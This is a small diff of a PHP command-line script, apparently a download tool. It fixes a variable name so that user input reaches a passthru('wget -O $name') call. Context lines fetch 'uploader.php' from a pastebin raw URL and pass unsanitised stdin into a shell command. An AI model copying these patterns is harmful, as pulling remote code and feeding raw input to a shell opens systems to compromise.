@@ -55,7 +55,7 @@ if ($filedown == 1) {
 	passthru("wget -O uploader.php http://pastebin.com/raw/1Rms1t8G");
 } elseif ($filedown == 4) {
 echo "File Data (file.php site.com/pathfile): ";
-$video = fgets(STDIN);
+$name = fgets(STDIN);
 passthru("wget -O $name");
 }
 } elseif ($list == 2) {
